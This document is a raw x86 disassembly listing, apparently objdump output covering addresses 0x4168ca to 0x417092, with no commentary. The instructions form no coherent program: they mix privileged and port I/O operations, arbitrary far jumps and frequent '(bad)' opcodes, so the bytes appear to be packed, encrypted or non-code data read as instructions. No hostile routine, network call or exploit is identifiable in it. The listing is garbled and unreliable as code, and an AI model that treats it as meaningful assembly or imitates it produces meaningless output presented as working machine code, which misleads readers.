  4168ca:	shl    BYTE PTR [eax+0x320d05b0],cl
  4168d0:	loopne 0x416886
  4168d2:	or     BYTE PTR [edx+0x363b7e99],al
  4168d8:	push   edx
  4168d9:	mov    ds:0x9164f842,al
  4168de:	ins    DWORD PTR es:[edi],dx
  4168df:	push   ebp
  4168e0:	stos   BYTE PTR es:[edi],al
  4168e1:	sbb    eax,0x2b52cfb7
  4168e6:	or     eax,0x7d32c45b
  4168eb:	neg    edi
  4168ed:	mov    ss,WORD PTR [esi+0x53]
  4168f0:	inc    ebx
  4168f1:	mov    ah,0xd7
  4168f3:	mov    eax,ds:0x769e13fa
  4168f8:	cmp    BYTE PTR [ebx+0xe],cl
  4168fb:	dec    ecx
  4168fc:	dec    ebp
  4168fd:	not    BYTE PTR [eax]
  4168ff:	(bad)  
  416900:	hlt    
  416901:	call   0x5ca2:0xfea2be0d
  416908:	mov    ebx,0x595d1714
  41690d:	and    dl,bl
  41690f:	fsub   DWORD PTR [ebx-0x35]
  416912:	cmovns esp,DWORD PTR [ebx]
  416915:	aas    
  416916:	jbe    0x4168a2
  416918:	mov    dh,0x55
  41691a:	pop    esi
  41691b:	int3   
  41691c:	adc    BYTE PTR [esi*1+0x431e8ab4],dl
  416923:	mov    bl,0xec
  416925:	out    0xb4,eax
  416927:	cmp    esp,ebp
  416929:	fstp   QWORD PTR [esi-0x5c61b7bf]
  41692f:	mov    ebx,0x83df4439
  416934:	push   ss
  416935:	and    eax,0xda2085b7
  41693a:	pop    edx
  41693b:	adc    esp,esp
  41693d:	ss loope 0x416993
  416940:	mov    dh,0xc2
  416942:	lea    ecx,[esi+0x3e]
  416945:	mov    al,0xa3
  416947:	and    BYTE PTR [edi+0x10],bh
  41694a:	or     esi,edi
  41694c:	rol    DWORD PTR [ecx],1
  41694e:	ror    esi,cl
  416950:	mov    edi,0x2de956b4
  416955:	in     eax,0x1f
  416957:	and    al,0x22
  416959:	jl     0x416983
  41695b:	sti    
  41695c:	popa   
  41695d:	cmc    
  41695e:	imul   esi,DWORD PTR [ecx+esi*4-0x5e7c9e30],0xffffffd3
  416966:	dec    edx
  416967:	jo     0x416921
  416969:	pop    ds
  41696a:	fadd   DWORD PTR [edi-0x525ea2cc]
  416970:	in     eax,dx
  416971:	dec    ecx
  416972:	popa   
  416973:	sub    eax,0x322ebad5
  416978:	mov    bh,0x16
  41697a:	and    esi,0x3b4eca36
  416980:	mul    edi
  416982:	lock scas eax,DWORD PTR es:[edi]
  416984:	cmp    al,0xeb
  416986:	mov    eax,0x6f17a087
  41698b:	cdq    
  41698c:	and    eax,0x92fa1b1f
  416991:	ret    0xef81
  416994:	stc    
  416995:	js     0x5990584a
  41699b:	mov    eax,ds:0xfca2b499
  4169a0:	cmp    eax,0xb9dce49
  4169a5:	sub    dl,bh
  4169a7:	arpl   WORD PTR [ecx+0x53],di
  4169aa:	fcom   QWORD PTR [eax]
  4169ac:	push   edx
  4169ad:	jns    0x416a16
  4169af:	xchg   esp,eax
  4169b0:	add    al,0xa7
  4169b2:	(bad)  
  4169b3:	add    BYTE PTR [edx+0x5dc171ed],bl
  4169b9:	test   al,0x71
  4169bb:	mov    eax,es
  4169bd:	jp     0x4169b3
  4169bf:	pop    ecx
  4169c0:	out    dx,eax
  4169c1:	leave  
  4169c2:	loop   0x4169e4
  4169c4:	jmp    0x8009dd61
  4169c9:	dec    edx
  4169ca:	ret    
  4169cb:	push   ecx
  4169cc:	pop    eax
  4169cd:	fdivr  QWORD PTR [edi+0x66]
  4169d0:	in     eax,dx
  4169d1:	xchg   edx,eax
  4169d2:	inc    eax
  4169d3:	xor    al,0x44
  4169d5:	xor    al,0xaf
  4169d7:	or     al,BYTE PTR [ebp-0x2fbf4652]
  4169dd:	and    DWORD PTR [eax-0x7c6af19b],0xffffffa2
  4169e4:	stos   BYTE PTR es:[edi],al
  4169e5:	sti    
  4169e6:	ins    BYTE PTR es:[edi],dx
  4169e7:	xor    cl,BYTE PTR [esi+0x57]
  4169ea:	in     eax,0x3b
  4169ec:	mov    al,0xe
  4169ee:	push   edx
  4169ef:	adc    eax,0x8b2d165
  4169f4:	or     DWORD PTR [ebx+edi*4-0x63],edi
  4169f8:	mov    cl,BYTE PTR [ebp+0x462ad1db]
  4169fe:	sub    BYTE PTR [eax-0x3d6d8e75],0x36
  416a05:	pop    ds
  416a06:	jle    0x4169fa
  416a08:	shl    DWORD PTR [ecx-0x398f2277],cl
  416a0e:	or     ch,BYTE PTR [edi+eiz*2-0x39]
  416a12:	xchg   DWORD PTR [ebx+eax*4-0x1bd9e1a0],ecx
  416a19:	sbb    al,0x72
  416a1b:	daa    
  416a1c:	cmp    eax,0x1bd39191
  416a21:	imul   esp,DWORD PTR [eax],0x827c34fd
  416a27:	bound  edi,QWORD PTR [eax-0x1df1c143]
  416a2d:	lea    ecx,[edx+ecx*1]
  416a30:	shl    dl,1
  416a32:	das    
  416a33:	and    BYTE PTR [edi+edx*2+0x72f565db],bh
  416a3a:	pop    edi
  416a3b:	jl     0x416a93
  416a3d:	push   ds
  416a3e:	jne    0x416ab2
  416a40:	dec    esp
  416a41:	packuswb mm4,QWORD PTR [edx-0xf]
  416a45:	mov    esi,0x9804c366
  416a4a:	ins    DWORD PTR es:[edi],dx
  416a4b:	clc    
  416a4c:	mov    eax,0x28e8222f
  416a51:	fs push 0x2e
  416a54:	xor    dh,dl
  416a56:	mov    dl,0xa
  416a58:	scas   eax,DWORD PTR es:[edi]
  416a59:	and    ebp,DWORD PTR [esi-0x28]
  416a5c:	or     eax,0xd2af0b21
  416a61:	retf   
  416a62:	adc    eax,0xe8fa8488
  416a67:	push   edx
  416a68:	in     eax,0x44
  416a6a:	out    dx,al
  416a6b:	add    DWORD PTR [edx],edi
  416a6d:	add    eax,0x81609f57
  416a72:	push   edi
  416a73:	adc    ecx,DWORD PTR [esi-0x207267b4]
  416a79:	into   
  416a7a:	mov    eax,ds:0x53e88ddd
  416a7f:	int3   
  416a80:	jle    0x416acc
  416a82:	or     eax,0x114789e8
  416a87:	lock pop eax
  416a89:	jae    0x416a23
  416a8b:	nop
  416a8c:	sahf   
  416a8d:	jns    0x416acb
  416a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a90:	out    dx,eax
  416a91:	mov    dl,0x54
  416a93:	add    al,0x64
  416a95:	addr16 add al,ah
  416a98:	test   ch,cl
  416a9a:	lds    ecx,FWORD PTR [ebp-0x54e5a5d0]
  416aa0:	pop    ss
  416aa1:	sbb    ebp,DWORD PTR [edx+ecx*4]
  416aa4:	pop    eax
  416aa5:	test   BYTE PTR [esi],cl
  416aa7:	xchg   ebp,eax
  416aa8:	xor    bl,BYTE PTR [eax+0x78]
  416aab:	enter  0x709,0x92
  416aaf:	ins    DWORD PTR es:[edi],dx
  416ab0:	test   eax,0x2552bf73
  416ab5:	retf   0x2b78
  416ab8:	std    
  416ab9:	cli    
  416aba:	scas   al,BYTE PTR es:[edi]
  416abb:	jns    0x416a83
  416abd:	xchg   edi,eax
  416abe:	xor    eax,0x1b7bcd66
  416ac3:	stos   DWORD PTR es:[edi],eax
  416ac4:	ss loopne 0x416af7
  416ac7:	call   0xcc752c40
  416acc:	aas    
  416acd:	sti    
  416ace:	jle    0x416ac5
  416ad0:	and    eax,0x32932f8e
  416ad5:	dec    ecx
  416ad6:	(bad)  
  416ad7:	cmp    esi,eax
  416ad9:	clc    
  416ada:	sub    eax,0xfd947e50
  416adf:	in     al,dx
  416ae0:	sbb    DWORD PTR [ecx],ebp
  416ae2:	imul   edx,DWORD PTR [edi-0x6c],0xc0c7bd9b
  416ae9:	pusha  
  416aea:	loope  0x416afd
  416aec:	pop    ds
  416aed:	(bad)  
  416aee:	mov    BYTE PTR [edx],ah
  416af0:	inc    esp
  416af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416af2:	cmp    DWORD PTR [edi],edi
  416af4:	loop   0x416abf
  416af6:	iret   
  416af7:	iret   
  416af8:	cmp    eax,0x69292083
  416afd:	mov    ebp,0x69b855c6
  416b02:	test   al,0xb1
  416b04:	(bad)  
  416b05:	xchg   ecx,eax
  416b06:	(bad)  
  416b07:	push   cs
  416b08:	adc    DWORD PTR [edx+0x34229df9],eax
  416b0e:	lods   al,BYTE PTR ds:[esi]
  416b0f:	pop    ebp
  416b10:	and    eax,0x875a4c33
  416b15:	cld    
  416b16:	jecxz  0x416ad9
  416b18:	add    al,0x2e
  416b1a:	pop    ss
  416b1b:	xchg   ecx,eax
  416b1c:	loope  0x416abe
  416b1e:	mov    dh,0xf4
  416b20:	mov    ah,0x77
  416b22:	clc    
  416b23:	sub    edi,DWORD PTR [edi-0x3]
  416b26:	scas   eax,DWORD PTR es:[edi]
  416b27:	arpl   WORD PTR [eax+0x70247074],cx
  416b2d:	shl    dh,cl
  416b2f:	cdq    
  416b30:	push   0xffffffa1
  416b32:	xor    al,0x11
  416b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b35:	out    0xd0,eax
  416b37:	jae    0x416b6e
  416b39:	arpl   ax,sp
  416b3b:	call   FWORD PTR [esi+0x3d7e7b9a]
  416b41:	aam    0x4
  416b43:	(bad)  
  416b44:	and    ecx,DWORD PTR [ebx+0x63]
  416b47:	call   DWORD PTR [ebx-0x1c358a3e]
  416b4d:	inc    esi
  416b4e:	push   es
  416b4f:	mov    al,0xba
  416b51:	add    cl,BYTE PTR [edi]
  416b53:	lock sbb DWORD PTR [eax+0x18],esp
  416b57:	mov    bh,BYTE PTR [edx+0xa]
  416b5a:	cmp    ecx,DWORD PTR [ebp+esi*2-0x3a]
  416b5e:	and    DWORD PTR [edx],ecx
  416b60:	xchg   ebx,eax
  416b61:	or     al,0xfd
  416b63:	add    eax,0x7fe4949a
  416b68:	mov    esp,0x3053b473
  416b6d:	jae    0x416b2a
  416b6f:	mov    ecx,0x4ea64880
  416b74:	in     al,dx
  416b75:	and    al,BYTE PTR [esi+ebp*1-0x2ed32de1]
  416b7c:	mov    cl,0x93
  416b7e:	hlt    
  416b7f:	pop    ss
  416b80:	loope  0x416b82
  416b82:	cdq    
  416b83:	mov    bh,0x86
  416b85:	sub    DWORD PTR [esi],edi
  416b87:	push   ecx
  416b88:	add    bh,BYTE PTR [ebp-0x39]
  416b8b:	es push ecx
  416b8d:	sub    cl,BYTE PTR [ecx-0x7558ee72]
  416b93:	ds xchg esp,eax
  416b95:	cdq    
  416b96:	sub    dl,BYTE PTR [edx+0x1c]
  416b99:	push   esi
  416b9a:	sbb    BYTE PTR [ecx-0x2a4bcc3d],dl
  416ba0:	int    0x22
  416ba2:	repz ffreep st(6)
  416ba5:	push   cs
  416ba6:	jmp    0x416bbe
  416ba8:	pop    ebp
  416ba9:	(bad)  [ebx+0x33]
  416bac:	sbb    edi,DWORD PTR [eax+0x7d2be233]
  416bb2:	imul   edx,DWORD PTR [esi],0x952f048e
  416bb8:	ret    0x23b4
  416bbb:	add    eax,0x340b98c
  416bc0:	fwait
  416bc1:	cmp    ch,0x87
  416bc4:	leave  
  416bc5:	(bad)  
  416bc6:	xchg   esi,eax
  416bc7:	mov    edx,0x19ef91a4
  416bcc:	push   eax
  416bcd:	xchg   dh,bl
  416bcf:	jg     0x416b85
  416bd1:	(bad)  
  416bd2:	ins    BYTE PTR es:[edi],dx
  416bd3:	mov    ebx,ss
  416bd5:	add    BYTE PTR [ebx],al
  416bd7:	aam    0x36
  416bd9:	push   ss
  416bda:	stos   BYTE PTR es:[edi],al
  416bdb:	sub    DWORD PTR [edx],ecx
  416bdd:	mov    DWORD PTR [edx+0x6556f4ff],esp
  416be3:	sub    eax,0x7f744ce9
  416be8:	mov    eax,0x42cfe6a2
  416bed:	or     ebx,DWORD PTR [ebx]
  416bef:	hlt    
  416bf0:	lods   eax,DWORD PTR ds:[esi]
  416bf1:	mov    DWORD PTR [edx],eax
  416bf3:	nop
  416bf4:	inc    eax
  416bf5:	aad    0xfd
  416bf7:	cmp    eax,0x97d21fb4
  416bfc:	lds    ecx,FWORD PTR [esi-0xd]
  416bff:	jg     0x416bf1
  416c01:	mov    ecx,0x954b82f8
  416c06:	sti    
  416c07:	je     0x416c17
  416c09:	std    
  416c0a:	mov    al,ds:0xce488e8e
  416c0f:	xor    dh,BYTE PTR [ebp+0x50]
  416c12:	ficomp WORD PTR [ecx+eiz*1+0xcaf7fdd]
  416c19:	shr    BYTE PTR [esi],1
  416c1b:	cmp    ebx,DWORD PTR [eax]
  416c1d:	inc    edx
  416c1e:	sbb    edi,DWORD PTR [esi-0x840b865]
  416c24:	shl    BYTE PTR [eax+0x5b4de642],cl
  416c2a:	mov    DWORD PTR [eax+0x2c],0x4aa0ec1d
  416c31:	inc    eax
  416c32:	xchg   esi,eax
  416c33:	jecxz  0x416c7b
  416c35:	aaa    
  416c36:	mov    bl,BYTE PTR [esi]
  416c38:	aaa    
  416c39:	shr    DWORD PTR [esi+edi*8],0x72
  416c3d:	stos   DWORD PTR es:[edi],eax
  416c3e:	cld    
  416c3f:	fmul   QWORD PTR [ecx-0x337def7e]
  416c45:	mov    bl,0xa9
  416c47:	iret   
  416c48:	popa   
  416c49:	mov    cs,WORD PTR [ebx]
  416c4b:	jb     0x416c57
  416c4d:	adc    eax,0xf52accd5
  416c52:	push   cs
  416c53:	push   edi
  416c54:	jp     0x416c46
  416c56:	push   0xffffffae
  416c58:	cmp    edx,DWORD PTR [edi+0x74]
  416c5b:	rcr    cl,cl
  416c5d:	mov    bl,0xce
  416c5f:	push   eax
  416c60:	dec    eax
  416c61:	push   ds
  416c62:	hlt    
  416c63:	mov    ds:0xbd341aec,al
  416c68:	outs   dx,BYTE PTR ds:[esi]
  416c69:	push   ecx
  416c6a:	sbb    BYTE PTR [edx-0x7],al
  416c6d:	pop    sp
  416c6f:	aaa    
  416c70:	cmp    BYTE PTR [edx-0x713b6d4],dl
  416c76:	out    dx,al
  416c77:	ins    DWORD PTR es:[edi],dx
  416c78:	lea    ebx,[edx]
  416c7a:	mov    cl,0x1e
  416c7c:	jb     0x416c7e
  416c7e:	sub    DWORD PTR [ecx+0x518502b3],ebx
  416c84:	inc    ecx
  416c85:	fdivr  QWORD PTR [ebx+edi*2+0x74be3002]
  416c8c:	call   0x73ffe204
  416c91:	dec    ebp
  416c92:	test   DWORD PTR [eax+0x63],0xbb04c57f
  416c99:	add    al,0x69
  416c9b:	push   ecx
  416c9c:	push   edi
  416c9d:	inc    eax
  416c9e:	mov    DWORD PTR [ecx],ebx
  416ca0:	aas    
  416ca1:	lahf   
  416ca2:	mov    bh,0xb1
  416ca4:	add    eax,0xee26073a
  416ca9:	leave  
  416caa:	push   esp
  416cab:	inc    edx
  416cac:	dec    edi
  416cad:	and    BYTE PTR [ecx],ch
  416caf:	es jg  0x416d2d
  416cb2:	popf   
  416cb3:	push   ebx
  416cb4:	xor    cl,BYTE PTR [ecx+0x6983ba9b]
  416cba:	mov    bl,0xa7
  416cbc:	and    al,0xd0
  416cbe:	xchg   BYTE PTR [edx+0x3d],bh
  416cc1:	rsm    
  416cc3:	fistp  QWORD PTR [edi+ebx*1-0x5273de89]
  416cca:	mov    esi,0xa169b8c5
  416ccf:	mov    ch,0x5a
  416cd1:	mov    edi,0x32303af6
  416cd6:	xchg   ebp,eax
  416cd7:	cmc    
  416cd8:	sbb    dl,bh
  416cda:	cs cmc 
  416cdc:	ret    0xfa87
  416cdf:	shr    BYTE PTR [edi+0x2ec48e50],0xa7
  416ce6:	mov    eax,ds:0x64747742
  416ceb:	xchg   ch,ch
  416ced:	jne    0x416d16
  416cef:	jl     0x416d07
  416cf1:	aam    0x2c
  416cf3:	cmp    DWORD PTR [eax],esi
  416cf5:	icebp  
  416cf6:	fadd   QWORD PTR ds:0x35c09b6d
  416cfc:	(bad)  
  416cfd:	jmp    0xde01:0xa9330ae0
  416d04:	mov    bh,0xc
  416d06:	xor    ecx,DWORD PTR [edi+0x148d46c5]
  416d0c:	ret    0x9d2
  416d0f:	ret    
  416d10:	dec    esi
  416d11:	bound  ecx,QWORD PTR [eax+0x44fcf32a]
  416d17:	and    dh,BYTE PTR [ebx+0x11]
  416d1a:	jmp    0x7e8d:0x9823d9c0
  416d21:	gs or  ebx,edx
  416d24:	or     ch,BYTE PTR [eax]
  416d26:	add    cl,BYTE PTR [edx+edx*2]
  416d29:	iretw  
  416d2b:	ins    BYTE PTR es:[edi],dx
  416d2c:	sbb    dh,ch
  416d2e:	test   al,0xf
  416d30:	mov    al,0x75
  416d32:	je     0x416d5f
  416d34:	xchg   ebp,eax
  416d35:	scas   eax,DWORD PTR es:[edi]
  416d36:	bound  ebp,QWORD PTR [edx-0x7c]
  416d39:	push   edi
  416d3a:	mov    bx,0xd502
  416d3e:	inc    ecx
  416d3f:	push   esi
  416d40:	adc    edx,edi
  416d42:	or     BYTE PTR [ecx],ch
  416d44:	fwait
  416d45:	inc    ebp
  416d46:	mov    ebx,0xc0f36837
  416d4b:	jg     0x416d67
  416d4d:	fst    QWORD PTR [ebp-0x1e]
  416d50:	xor    DWORD PTR [ebx+esi*2-0x3e],ebp
  416d54:	or     edx,DWORD PTR [edi]
  416d56:	xchg   edx,eax
  416d57:	scas   eax,DWORD PTR es:[edi]
  416d58:	jmp    eax
  416d5a:	sahf   
  416d5b:	sbb    dl,BYTE PTR [eax]
  416d5d:	repnz sbb DWORD PTR [edx],ecx
  416d60:	(bad)  
  416d61:	and    cl,BYTE PTR [eax+0xf184934]
  416d67:	adc    al,0x89
  416d69:	pop    ecx
  416d6a:	ss cmp al,0xab
  416d6d:	pop    edi
  416d6e:	and    eax,0x376f955e
  416d73:	fs test eax,0xf227ecd0
  416d79:	mov    ebp,0x5ea7097f
  416d7e:	and    al,0x95
  416d80:	bound  ecx,QWORD PTR [eax+ebx*4-0x70]
  416d84:	dec    edx
  416d85:	push   ebp
  416d86:	push   ss
  416d87:	sbb    DWORD PTR cs:[esi+eiz*4+0x27],edx
  416d8c:	cs int 0x8b
  416d8f:	jbe    0x6dce4a52
  416d95:	add    al,0x2d
  416d97:	or     BYTE PTR [eax-0x266af745],0xef
  416d9e:	dec    ebx
  416d9f:	out    0xb6,al
  416da1:	push   ss
  416da2:	sub    edx,ebp
  416da4:	not    BYTE PTR [eax+esi*8+0x4]
  416da8:	jmp    0x8d4b:0xe930628e
  416daf:	cmc    
  416db0:	and    al,0x96
  416db2:	and    bl,BYTE PTR [edi]
  416db4:	test   esp,esp
  416db6:	retf   
  416db7:	sbb    ah,cl
  416db9:	(bad)  
  416dba:	les    edi,FWORD PTR [esi-0x387450fa]
  416dc0:	inc    ecx
  416dc1:	(bad)  
  416dc3:	call   DWORD PTR [esi-0x70a1dbf6]
  416dc9:	aaa    
  416dca:	lea    ebp,[ebp-0x25]
  416dcd:	test   al,0xde
  416dcf:	outs   dx,DWORD PTR ds:[esi]
  416dd0:	mov    bl,0xc9
  416dd2:	inc    esp
  416dd3:	loop   0x416df2
  416dd5:	mov    ebx,0x432b183f
  416dda:	sbb    ch,dh
  416ddc:	nop
  416ddd:	les    ebx,FWORD PTR [ebx]
  416ddf:	sar    DWORD PTR [ecx+0x326378c1],0x36
  416de6:	sub    cl,BYTE PTR [esi-0x78c366e8]
  416dec:	mov    ebp,0x5164b95c
  416df1:	lods   eax,DWORD PTR ds:[esi]
  416df2:	jnp    0x416e00
  416df4:	or     DWORD PTR [edi-0x13f8f343],ebx
  416dfa:	gs inc sp
  416dfd:	jl     0x416dd6
  416dff:	loope  0x416e09
  416e01:	jbe    0x416e50
  416e03:	mov    bh,0xd6
  416e05:	sbb    edx,DWORD PTR [esi+0x25]
  416e08:	bound  esp,QWORD PTR [edi]
  416e0a:	ins    BYTE PTR es:[edi],dx
  416e0b:	adc    dl,al
  416e0d:	mov    bl,0xa3
  416e0f:	in     eax,0x23
  416e11:	iret   
  416e12:	gs inc eax
  416e14:	jmp    0x2087:0x99dcd293
  416e1b:	sar    eax,cl
  416e1d:	cli    
  416e1e:	mov    ds:0x2d1344fb,al
  416e23:	shr    BYTE PTR [ecx+0x6f17a48e],0x14
  416e2a:	sahf   
  416e2b:	rcr    DWORD PTR [edi+eiz*4-0x16],1
  416e2f:	ret    0x9bcc
  416e32:	cdq    
  416e33:	adc    BYTE PTR ds:[ecx+0x8aeeed3],al
  416e3a:	xor    eax,0xdea33376
  416e3f:	jne    0x416e7a
  416e41:	iret   
  416e42:	fwait
  416e43:	retf   0xbad2
  416e46:	mov    edi,0x571cec65
  416e4b:	int    0xa7
  416e4d:	pop    esi
  416e4e:	xchg   ecx,eax
  416e4f:	and    BYTE PTR [eax],0x48
  416e52:	add    DWORD PTR [ecx+0x6],edx
  416e55:	push   es
  416e56:	adc    BYTE PTR [edx+eax*1+0x6ff045a],ch
  416e5d:	(bad)  
  416e5e:	or     BYTE PTR [esi+0x25],bh
  416e61:	pop    ebp
  416e62:	dec    esi
  416e63:	jbe    0x416e0a
  416e65:	inc    DWORD PTR [ebx+eiz*8]
  416e68:	pop    ds
  416e69:	xor    al,0x40
  416e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e6c:	sbb    bh,BYTE PTR [esi+0x4b]
  416e6f:	mov    ebx,0x80b969f3
  416e74:	inc    edx
  416e75:	int3   
  416e76:	dec    esi
  416e77:	xchg   edx,esp
  416e79:	sbb    bh,BYTE PTR [esi-0x10]
  416e7c:	aas    
  416e7d:	jnp    0x416e7f
  416e7f:	int3   
  416e80:	out    dx,al
  416e81:	push   esp
  416e82:	dec    esi
  416e83:	and    bl,bh
  416e85:	stos   DWORD PTR es:[edi],eax
  416e86:	imul   ecx,DWORD PTR [ebp+0x554a0730],0x464ba5b8
  416e90:	add    DWORD PTR [edi-0x78],eax
  416e93:	mov    edx,DWORD PTR [edx-0x21]
  416e96:	cmp    ebx,DWORD PTR [esi]
  416e98:	fwait
  416e99:	xchg   esp,eax
  416e9a:	(bad)  
  416e9b:	mov    esp,0x7d7cc9cb
  416ea0:	into   
  416ea1:	lahf   
  416ea2:	inc    eax
  416ea3:	xchg   esp,edx
  416ea5:	xchg   ecx,eax
  416ea6:	fistp  DWORD PTR [edx-0x69]
  416ea9:	push   ds
  416eaa:	(bad)
  416eae:	iret   
  416eaf:	pop    es
  416eb0:	sub    ebp,DWORD PTR [eax]
  416eb2:	xchg   edx,eax
  416eb3:	out    dx,eax
  416eb4:	loopne 0x416e57
  416eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eb7:	dec    ebp
  416eb8:	es add al,0x5
  416ebb:	lods   al,BYTE PTR ds:[esi]
  416ebc:	dec    eax
  416ebd:	ja     0x416e64
  416ebf:	mov    esi,0x4b7c3a81
  416ec4:	push   edx
  416ec5:	lods   al,BYTE PTR ds:[esi]
  416ec6:	xchg   ecx,eax
  416ec7:	adc    esp,0x16
  416eca:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  416ecc:	out    0x25,eax
  416ece:	arpl   bx,bp
  416ed0:	cmp    cl,0x5d
  416ed3:	js     0x416f43
  416ed5:	data16 mov ch,0xe1
  416ed8:	inc    ecx
  416ed9:	pop    ecx
  416eda:	call   0x92aed0d8
  416edf:	inc    eax
  416ee0:	imul   ebx,DWORD PTR [edx+0x1f0e404],0xffffff90
  416ee7:	sti    
  416ee8:	and    bh,al
  416eea:	imul   esi,DWORD PTR [ebx],0xfa810508
  416ef0:	inc    esp
  416ef1:	pop    edx
  416ef2:	in     eax,0x9f
  416ef4:	test   BYTE PTR [esi+0x7d],cl
  416ef7:	sub    ebp,ecx
  416ef9:	mov    edi,esp
  416efb:	pop    es
  416efc:	aad    0xc1
  416efe:	adc    al,0x9b
  416f00:	fadd   DWORD PTR [edi]
  416f02:	and    BYTE PTR [ecx+0x15],0x2c
  416f06:	shr    DWORD PTR [ecx-0x33],cl
  416f09:	pop    edi
  416f0a:	xchg   edi,eax
  416f0b:	mov    dh,0x1b
  416f0d:	ins    BYTE PTR es:[edi],dx
  416f0e:	ret    0x2b23
  416f11:	inc    ebp
  416f12:	and    bl,dl
  416f14:	push   eax
  416f15:	sahf   
  416f16:	mov    BYTE PTR [edx-0x61c2c55a],cl
  416f1c:	jo     0x416ee9
  416f1e:	add    eax,esi
  416f20:	push   eax
  416f21:	mov    edx,0xaa4f5f8b
  416f26:	push   ecx
  416f27:	lods   eax,DWORD PTR ds:[esi]
  416f28:	aas    
  416f29:	lds    eax,FWORD PTR [ebx+edx*4-0x6dbe3a44]
  416f30:	icebp  
  416f31:	inc    esi
  416f32:	adc    eax,0x7f2fe885
  416f37:	js     0x416ec5
  416f39:	call   DWORD PTR [esi-0x7e]
  416f3c:	pop    esp
  416f3d:	cmp    al,dh
  416f3f:	mov    al,BYTE PTR [eax+0x4b]
  416f42:	in     al,0xfe
  416f44:	arpl   WORD PTR [esi-0x7b1931e8],dx
  416f4a:	dec    esp
  416f4b:	jne    0x416f1a
  416f4d:	push   0xfffffff7
  416f4f:	pop    ecx
  416f50:	pop    ecx
  416f51:	lods   eax,DWORD PTR ds:[esi]
  416f52:	mov    eax,0x15cd93eb
  416f57:	in     eax,0x84
  416f59:	lods   al,BYTE PTR ds:[esi]
  416f5a:	add    ebp,DWORD PTR [eax]
  416f5c:	repnz rcr DWORD PTR [eax],0xb8
  416f60:	das    
  416f61:	cmp    BYTE PTR [edi-0x2e035cd3],0xa4
  416f68:	mov    cl,0x68
  416f6a:	xor    BYTE PTR [eax+0x2f],dl
  416f6d:	lahf   
  416f6e:	or     ch,BYTE PTR [ebp+0x10a08875]
  416f74:	push   edx
  416f75:	les    edx,FWORD PTR [ecx-0x4261de53]
  416f7b:	loop   0x416f41
  416f7d:	pop    eax
  416f7e:	mov    esp,0x9422d789
  416f83:	ror    dl,cl
  416f85:	xchg   ebp,eax
  416f86:	sar    DWORD PTR [esi-0x71],cl
  416f89:	(bad)  
  416f8a:	xchg   esp,eax
  416f8b:	sbb    esi,DWORD PTR [esi-0x1a06fdfd]
  416f91:	je     0x416f7f
  416f93:	out    0x17,eax
  416f95:	fsubr  QWORD PTR [edx]
  416f97:	adc    ebx,DWORD PTR [ebx+0x633eacd3]
  416f9d:	xor    al,0xd4
  416f9f:	add    edx,ebx
  416fa1:	fistp  DWORD PTR [edi]
  416fa3:	and    dh,BYTE PTR [ecx-0x504cbc4c]
  416fa9:	shl    BYTE PTR [ecx],0xb
  416fac:	jmp    0xa364:0xb0ca4b0b
  416fb3:	jle    0x416f98
  416fb5:	and    cl,dh
  416fb7:	aas    
  416fb8:	xchg   ecx,eax
  416fb9:	fs push 0x87add5d9
  416fbf:	mov    eax,ds:0x15c4a9f0
  416fc4:	scas   al,BYTE PTR es:[edi]
  416fc5:	repz add eax,0x30dd2316
  416fcb:	test   al,0xa7
  416fcd:	cmp    DWORD PTR [esi-0xc8db1b4],edx
  416fd3:	dec    ebx
  416fd4:	in     eax,dx
  416fd5:	or     al,0x47
  416fd7:	in     al,0x7d
  416fd9:	add    eax,0xb32e0251
  416fde:	les    esp,FWORD PTR [ecx]
  416fe0:	or     eax,0x72d5652
  416fe5:	xor    bl,bl
  416fe7:	clc    
  416fe8:	in     al,0x9d
  416fea:	lock adc BYTE PTR [esi-0x8],bh
  416fee:	jl     0x416fef
  416ff0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ff3:	mov    dh,0x1a
  416ff5:	cmp    al,0x14
  416ff7:	daa    
  416ff8:	es dec ebx
  416ffa:	mov    ds:0x397e07ef,al
  416fff:	jge    0x416fc5
  417001:	mov    dl,0x3
  417003:	mov    dh,0xa6
  417005:	sbb    eax,0xc85f91e6
  41700a:	inc    esp
  41700b:	inc    esp
  41700c:	nop
  41700d:	xor    bl,BYTE PTR [eax+esi*8]
  417010:	pop    eax
  417011:	mov    edi,0xbf52b7f4
  417016:	adc    esi,DWORD PTR [ebp-0x613148d8]
  41701c:	cs inc ecx
  41701e:	mov    dl,0xed
  417020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417021:	mov    dl,0x84
  417023:	stc    
  417024:	pop    esi
  417025:	xchg   BYTE PTR [ecx],bh
  417027:	inc    ecx
  417028:	repnz mov ecx,0xbdc175ff
  41702e:	mov    cl,0xe4
  417030:	mov    ecx,0x3b063cf7
  417035:	lds    esi,FWORD PTR [esp+esi*4+0x4ada8805]
  41703c:	xor    DWORD PTR [edx+0x63d4a4da],esi
  417042:	or     al,0xe7
  417044:	pop    edx
  417045:	push   ebx
  417046:	xchg   edi,eax
  417047:	sti    
  417048:	(bad)  
  417049:	js     0x417074
  41704b:	loopne 0x4170c8
  41704d:	cld    
  41704e:	jns    0x41708b
  417050:	outs   dx,BYTE PTR ds:[esi]
  417051:	and    cl,BYTE PTR [edi-0x42]
  417054:	mov    al,ds:0x86a4a2e
  417059:	jae    0x417049
  41705b:	push   ds
  41705c:	(bad)  
  41705d:	repz inc ecx
  41705f:	leave  
  417060:	xor    edi,DWORD PTR [eax+0x7fe11904]
  417066:	(bad)  
  417068:	iret   
  417069:	pop    esi
  41706a:	xchg   ecx,eax
  41706b:	outs   dx,BYTE PTR ds:[esi]
  41706c:	stc    
  41706d:	fucomi st,st(1)
  41706f:	loope  0x41701d
  417071:	iret   
  417072:	shl    al,1
  417074:	xchg   edi,eax
  417075:	sbb    bh,bl
  417077:	popf   
  417078:	dec    BYTE PTR [esi+edi*4-0x7b]
  41707c:	or     bh,BYTE PTR [ebp+ecx*1+0x5d]
  417080:	pop    edi
  417081:	dec    DWORD PTR [edx]
  417083:	or     al,0x2b
  417085:	xchg   ecx,eax
  417086:	ret    0xc0a1
  417089:	ret    
  41708a:	jp     0x41708f
  41708c:	inc    ebx
  41708d:	pop    eax
  41708e:	fs jb  0x41706a
  417091:	cld    
  417092:	add    al,0x3d
